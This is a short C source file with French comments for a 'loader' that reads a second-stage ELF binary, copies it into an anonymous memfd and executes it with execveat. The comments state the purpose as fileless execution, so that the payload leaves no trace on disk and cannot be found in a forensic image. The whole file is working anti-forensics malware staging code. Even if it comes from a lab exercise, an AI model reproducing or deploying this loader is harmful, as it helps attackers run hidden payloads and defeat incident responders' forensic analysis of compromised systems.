/* loader - execute stage2 de maniere FILELESS (sans fichier sur disque).
 *
 * Lit l'ELF stage2 (passe en argv[1], typiquement depuis un tmpfs/RAM qui sera
 * ensuite efface), le copie dans un memfd anonyme, et l'execute via execveat.
 * Dans /proc/<pid>/maps, le binaire apparait comme "memfd:stage2 (deleted)" :
 * il n'existe nulle part sur le disque -> introuvable dans l'image F4.
 *
 * Compilation : gcc -O2 -o loader loader.c
 * Usage       : ./loader ./stage2 <key_hex32> <nonce_hex8>
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

int main(int argc, char **argv) {
    if (argc < 4) { fprintf(stderr, "usage: %s <elf> <key_hex> <nonce_hex>\n", argv[0]); return 1; }

    int src = open(argv[1], O_RDONLY);
    if (src < 0) { perror("open"); return 1; }

    int fd = syscall(SYS_memfd_create, "stage2", 0);
    if (fd < 0) { perror("memfd_create"); return 1; }

    char buf[65536]; ssize_t n;
    while ((n = read(src, buf, sizeof buf)) > 0) {
        for (ssize_t off = 0; off < n; ) {
            ssize_t w = write(fd, buf + off, n - off);
            if (w <= 0) { perror("write"); return 1; }
            off += w;
        }
    }
    close(src);

    /* argv pour stage2 : nom affiche + cle + nonce */
    char *nargv[] = { "stage2", argv[2], argv[3], NULL };
    char *nenv[]  = { NULL };
    syscall(SYS_execveat, fd, "", nargv, nenv, AT_EMPTY_PATH);
    perror("execveat");
    return 1;
}
